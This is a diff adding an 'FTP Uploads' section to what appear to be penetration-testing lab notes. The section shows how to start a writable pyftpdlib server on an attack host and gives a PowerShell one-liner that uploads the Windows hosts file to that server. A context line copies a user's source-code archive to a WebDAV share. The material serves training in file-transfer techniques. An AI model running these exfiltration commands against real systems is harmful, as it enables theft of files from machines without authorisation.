@@ -312,3 +312,14 @@ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ C
 
 
 ## FTP Uploads
+Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.
+```shell
+sudo python3 -m pyftpdlib --port 21 --write
+```
+![](../../Attachements/Pasted%20image%2020260726211628.png)
+Now let's use the PowerShell upload function to upload a file to our FTP Server.
+
+#### PowerShell Upload File
+```powershell
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
